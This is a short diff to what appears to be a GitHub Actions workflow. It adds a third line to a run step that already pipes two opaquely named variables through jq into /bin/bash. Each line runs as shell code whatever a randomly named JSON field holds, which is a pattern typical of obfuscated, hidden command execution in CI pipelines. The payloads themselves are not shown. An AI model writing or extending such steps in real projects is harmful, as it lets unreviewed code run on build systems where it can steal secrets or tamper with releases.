@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$kmea426" | jq -r .et9 | /bin/bash
           echo $i7480 | jq -r .gciu1 | /bin/bash
+          echo $zzj500 | jq -r .xm707 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
